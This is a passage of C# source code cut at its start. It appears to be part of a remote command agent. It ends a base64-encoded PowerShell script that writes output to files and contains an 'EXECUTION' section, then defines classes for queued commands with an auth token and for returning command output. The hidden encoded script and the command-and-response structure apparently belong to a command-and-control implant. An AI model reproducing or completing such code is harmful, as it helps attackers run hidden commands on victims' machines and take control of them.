tbaW8uZmlsZV06OldyaXRlQWxsQnl0ZXMoJG9mLCAkT3V0cHV0KX0KICAgICAgICB9CiAgICB9CiAgICAjIyMjIyMjIyMjIEVYRUNVVElPTiAjIyMjIyMjIyMjCn0K"));
        }
    }

    public class Content
    {
        public string NextId { get; set; }
        public string NextAuth { get; set; }
        public string[] Commands { get; set; }

    }
    
    public class Response
    {   
        public Response(string output, string reqid)
        {
            Output = output;
            ReqId = reqid;
        }
        public string Output { get; set; }
        public string ReqId { get; set; }
    }
    
}
